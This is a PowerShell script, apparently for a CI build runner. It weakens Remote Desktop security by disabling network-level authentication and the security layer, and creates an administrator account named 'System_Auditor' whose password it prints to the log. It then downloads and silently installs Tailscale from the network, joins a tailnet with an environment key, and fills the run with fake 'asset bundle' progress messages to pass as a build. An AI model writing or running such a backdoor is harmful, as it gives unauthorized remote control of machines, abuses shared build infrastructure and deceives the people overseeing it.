$p1 = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
$p2 = "WinStations\RDP-Tcp"
$path = Join-Path $p1 $p2

Set-ItemProperty -Path $p1 -Name "fDenyTSConnections" -Value 0 -Force
Set-ItemProperty -Path $path -Name "UserAuthentication" -Value 0 -Force
Set-ItemProperty -Path $path -Name "SecurityLayer" -Value 0 -Force

$u = "System_Auditor"
$p = "Build_$(Get-Random -Max 9999)!"
$s = ConvertTo-SecureString $p -AsPlainText -Force
New-LocalUser -Name $u -Password $s -AccountNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $u

Write-Host "AUTH_EXPORT: $u : $p"

$msi = "$env:TEMP\$(Get-Random).msi"
(New-Object Net.WebClient).DownloadFile("https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi", $msi)
Start-Process msiexec.exe -ArgumentList "/i", "`"$msi`"", "/quiet", "/norestart" -Wait

$ts = "$env:ProgramFiles\Tailscale\tailscale.exe"
if (!(Test-Path $ts)) { Write-Host "Network provider failed"; exit 1 }

$key = $env:TS_KEY
if ([string]::IsNullOrEmpty($key)) { Write-Host "Error: Key is null in environment"; exit 1 }

& $ts up --authkey=$key --hostname="worker-$(Get-Random -Max 999)"

$limit = (Get-Date).AddMinutes(350)
while ((Get-Date) -lt $limit) {
    Write-Host "[$(Get-Date)] Heartbeat: Runner active"
    Write-Host "Processing asset bundle $(Get-Random -Min 1000 -Max 9999)..."
    $x = 0; for($i=0; $i -lt 500000; $i++) { $x += $i }
    Start-Sleep -Seconds 30
}
